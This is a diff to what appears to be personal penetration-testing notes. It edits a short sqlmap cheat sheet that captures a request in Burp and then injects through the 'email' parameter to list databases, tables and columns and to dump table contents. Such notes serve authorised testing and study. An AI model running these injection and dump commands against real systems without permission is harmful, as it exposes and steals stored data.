@@ -3,9 +3,9 @@
 ## SqlMap
 
 Get Request from Burp (Proxy request, send to repeater, copy all text, r-c copy to file)
-sqlmap -r reset.req -p email --batch --level 3 (--dbs)
-sqlmap -r reset.req -p email --batch --level 3 -D <db name> --tables
-sqlmap -r reset.req -p email --batch --level 3 -D <db name> -T <table name> --columns
+sqlmap -r <req file> -p email --batch --level 3 (--dbs)
+sqlmap -r <req file> -p email --batch --level 3 -D <db name> --tables
+sqlmap -r <req file> -p email --batch --level 3 -D <db name> -T <table name> --columns
 OR
 sqlmap -r reset.req -p email --batch --level 3 -D <db name> -T <table name> --dump
 
